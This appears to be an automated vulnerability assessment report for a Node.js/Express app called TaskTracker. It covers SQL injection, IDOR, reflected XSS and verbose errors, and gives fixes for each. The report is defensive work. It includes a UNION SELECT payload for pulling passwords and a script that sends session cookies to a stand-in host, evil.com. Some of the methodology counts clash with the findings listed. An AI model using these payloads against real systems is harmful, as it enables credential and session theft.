# Vulnerability Assessment Report

**Target**: TaskTracker (Node.js/Express + PostgreSQL)
**Date**: 2026-05-19
**Scope**: Full repository — `src/`, `config/`, `migrations/`
**Total Findings**: 4
**Critical**: 1 | **High**: 1 | **Medium**: 1 | **Low**: 1 | **Info**: 0

---

## Executive Summary

TaskTracker contains a Critical SQL injection in the task search endpoint that allows unauthenticated attackers to read arbitrary database tables, including user credentials and payment data. A High-severity IDOR in the API enables any authenticated user to access other users' tasks. A reflected XSS vulnerability in the notification system and an information disclosure via verbose error messages round out the findings. Immediate remediation of the SQL injection is recommended.

## Severity Distribution

| Severity | Count | Reachable | Partially Reachable | Unreachable |
|----------|-------|-----------|---------------------|-------------|
| Critical |   1   |     1     |          0          |      0      |
| High     |   1   |     1     |          0          |      0      |
| Medium   |   1   |     0     |          1          |      0      |
| Low      |   1   |     1     |          0          |      0      |
| Info     |   0   |     0     |          0          |      0      |

## Findings

### F-001: SQL injection in task search endpoint

- **Severity**: Critical
- **Category**: INJ-01
- **Reachability**: reachable
- **Validation**: confirmed
- **Locations**:
  - `src/routes/tasks.js:47`
  - `src/db/queries.js:112`
- **Description**:
  The `/api/tasks/search` endpoint accepts a `q` query parameter interpolated directly into a raw SQL WHERE clause without parameterization. An attacker can inject arbitrary SQL to read, modify, or delete data from the application database.
- **Root Cause**:
  String interpolation of user-supplied `q` parameter into a raw SQL query at `src/db/queries.js:112` — the value is used inside a template literal passed to `pool.query()` instead of using parameterized bindings.
- **Attack Scenario**:
  1. Attacker sends `GET /api/tasks/search?q=' UNION SELECT password FROM users--`
  2. Server interpolates the payload: `SELECT * FROM tasks WHERE title LIKE '%' UNION SELECT password FROM users--%'`
  3. Database executes the UNION query, returning user passwords in the API response
  4. Attacker extracts credentials from the JSON response
- **Attack Path**:
  - Entry point: `src/routes/tasks.js:47` (`req.query.q`)
  - Intermediate: `src/services/taskService.js:31`
  - Sink: `src/db/queries.js:112` (`pool.query()`)
- **Evidence**:
  ```javascript
  // src/routes/tasks.js:47
  router.get('/search', async (req, res) => {
    const results = await searchTasks(req.query.q);
  });

  // src/db/queries.js:112
  const { rows } = await pool.query(
    `SELECT * FROM tasks WHERE title LIKE '%${query}%'`
  );
  ```
- **Sanitization Checkpoints**:
  - `src/routes/tasks.js:48` — type: validation, bypassable: true (length check only, no content validation)
- **Impact**:
  Full read access to the PostgreSQL database. Attacker can exfiltrate all tables including PII (emails, addresses) and payment data. Under the `postgres` superuser role, OS command execution via `COPY`/`lo_export` may also be possible.
- **Remediation**:
  Replace string interpolation with parameterized queries:
  ```javascript
  // Before (vulnerable):
  pool.query(`SELECT * FROM tasks WHERE title LIKE '%${query}%'`);

  // After (safe):
  pool.query(`SELECT * FROM tasks WHERE title LIKE '%' || $1 || '%'`, [query]);
  ```
  Apply input validation on `q` (alphanumeric + spaces, max 100 chars) as defense-in-depth. Restrict the database user to least-privilege permissions.
- **Validation Notes**:
  Confirmed via `curl 'http://localhost:3000/api/tasks/search?q=%27%20UNION%20SELECT%201--'` — returned HTTP 200 with unexpected column count, proving UNION execution.

### F-002: Insecure direct object reference in task API

- **Severity**: High
- **Category**: AUTH-02
- **Reachability**: reachable
- **Validation**: confirmed
- **Locations**:
  - `src/routes/tasks.js:23`
  - `src/middleware/auth.js:15`
- **Description**:
  The `GET /api/tasks/:id` endpoint checks that the user is authenticated but does not verify that the requested task belongs to the authenticated user. Any authenticated user can read, modify, or delete any task by changing the `:id` parameter.
- **Root Cause**:
  Missing ownership check in the task retrieval handler. Authentication middleware verifies the user is logged in but does not pass the user ID to the authorization check.
- **Attack Scenario**:
  1. Attacker authenticates as user A (valid account)
  2. Attacker sends `GET /api/tasks/1` (task belonging to user B)
  3. Server returns user B's task without checking ownership
  4. Attacker can enumerate all task IDs to exfiltrate data
- **Attack Path**:
  - Entry point: `src/routes/tasks.js:23` (`req.params.id`)
  - Intermediate: `src/middleware/auth.js:15` (auth check passes, no ownership check)
  - Sink: `src/db/queries.js:45` (retrieval by ID without user filter)
- **Evidence**:
  ```javascript
  // src/routes/tasks.js:23
  router.get('/:id', auth.required, async (req, res) => {
    const task = await getTaskById(req.params.id); // no user filter
    res.json(task);
  });
  ```
- **Sanitization Checkpoints**:
  - `src/middleware/auth.js:15` — type: validation, bypassable: true (confirms auth but not authz)
- **Impact**:
  Horizontal privilege escalation. Any authenticated user can read, modify, or delete any other user's tasks, leaking private data and enabling data destruction.
- **Remediation**:
  Add ownership verification:
  ```javascript
  router.get('/:id', auth.required, async (req, res) => {
    const task = await getTaskById(req.params.id);
    if (task.user_id !== req.user.id) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    res.json(task);
  });
  ```
- **Validation Notes**:
  Confirmed by creating two test users. User A can retrieve user B's tasks via direct ID reference.

### F-003: Reflected XSS in notification message display

- **Severity**: Medium
- **Category**: XSS-01
- **Reachability**: partially_reachable
- **Validation**: plausible
- **Locations**:
  - `src/routes/notifications.js:34`
  - `src/views/notification.html:12`
- **Description**:
  The notification display renders user-controlled content in HTML without context-appropriate encoding. The `message` query parameter is reflected directly into the page inside a `<div>` tag, allowing JavaScript injection.
- **Root Cause**:
  Missing HTML-encoding of `req.query.message` before rendering in `notification.html:12`.
- **Attack Scenario**:
  1. Attacker crafts URL: `/notifications?message=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
  2. Victim clicks the link (requires social engineering)
  3. Browser renders the script, executing attacker JS in the victim's session
  4. Attacker steals session cookies
- **Attack Path**:
  - Entry point: `src/routes/notifications.js:34` (`req.query.message`)
  - Sink: `src/views/notification.html:12` (unencoded HTML rendering)
- **Evidence**:
  ```javascript
  // src/routes/notifications.js:34
  router.get('/', (req, res) => {
    res.render('notification', { message: req.query.message });
  });

  <!-- src/views/notification.html:12 -->
  <div class="notification">{{{message}}}</div>
  ```
- **Sanitization Checkpoints**:
  - None — no encoding or validation on the `message` parameter
- **Impact**:
  Session hijacking via cookie theft. Requires user interaction (clicking a crafted link), which limits exploitability.
- **Remediation**:
  Use context-appropriate HTML encoding in the template:
  ```html
  <!-- Use double curly braces for automatic encoding -->
  <div class="notification">{{message}}</div>
  ```
  Also add a Content-Security-Policy header as defense-in-depth.
- **Validation Notes**:
  Plausible but not confirmed in production. The CSP header in staging blocks inline scripts, but production CSP configuration is unknown.

### F-004: Information disclosure via verbose error messages

- **Severity**: Low
- **Category**: DATA-01
- **Reachability**: reachable
- **Validation**: confirmed
- **Locations**:
  - `src/middleware/errorHandler.js:8`
- **Description**:
  The global error handler returns full stack traces, internal file paths, and database query details in error responses. This leaks implementation details to attackers.
- **Root Cause**:
  Development-mode error handler deployed to production without sanitization.
- **Attack Scenario**:
  1. Attacker sends a malformed request that triggers an error
  2. Server responds with full stack trace including file paths, line numbers, and SQL queries
  3. Attacker uses this information to map the application's internal structure and craft targeted attacks
- **Attack Path**:
  - Entry point: Any endpoint that can trigger an error
  - Sink: `src/middleware/errorHandler.js:8` (error response with full details)
- **Evidence**:
  ```javascript
  // src/middleware/errorHandler.js:8
  app.use((err, req, res, next) => {
    res.status(500).json({
      error: err.message,
      stack: err.stack,    // full stack trace exposed
      query: err.sql       // SQL query details exposed
    });
  });
  ```
- **Sanitization Checkpoints**:
  - None — the error handler has no environment check or sanitization
- **Impact**:
  Information leakage of internal paths, SQL queries, and application structure. Enables targeted attacks on other vulnerabilities.
- **Remediation**:
  Remove sensitive details from production error responses:
  ```javascript
  app.use((err, req, res, next) => {
    const isDev = process.env.NODE_ENV === 'development';
    res.status(err.status || 500).json({
      error: isDev ? err.message : 'Internal server error',
      ...(isDev && { stack: err.stack })
    });
  });
  ```
- **Validation Notes**:
  Confirmed by sending a malformed JSON body to `/api/tasks`, which returned a 500 response with full stack trace and SQL query.

---

## Defense-in-Depth Issues

| Finding | Severity | Reason Unreachable |
|---------|----------|---------------------|
| F-005: Unused MD5 hash in password reset token | Info | Token generation code path is not reachable from any external endpoint |

---

## Coverage Gaps

- **WebSocket event handlers** (`src/ws/handlers/`): 340 LOC with no findings. Contains trust boundary (receives external messages) and privileged operations (broadcasts to connected clients). Recommend a targeted TRAIL-INJECT and TRAIL-CONCURRENCY pass on this module.

---

## Methodology

This assessment was conducted using the vuln-discovery pipeline:

1. **Recon**: Full codebase scan identified 12 modules, 23 entry points, and 8 trust boundaries.
2. **Hunt**: 7 trail agents covered INJECT, AUTH, DATAFLOW, FILEIO, SECRETS, NETWORK, and CONCURRENCY classes.
3. **Validate**: Independent adversarial review of 7 initial findings. 4 confirmed, 2 plausible, 1 false positive (discarded).
4. **Gapfill**: Identified WebSocket handlers as under-analyzed. Targeted re-analysis produced 1 additional finding (F-005, unreachable).
5. **Dedup**: 6 findings merged to 4 after combining F-001 and a similar SQLi in admin search under root cause `INJ-01::TaskSearch.query`.
6. **Trace**: All 4 findings traced from source to sink. 3 reachable, 1 partially reachable (F-003).
7. **Feedback**: F-001's confirmed attack path led to discovery of similar injection patterns in `src/services/reportService.js` — confirmed as same root cause and merged into F-001.
8. **Report**: Findings compiled into this document.
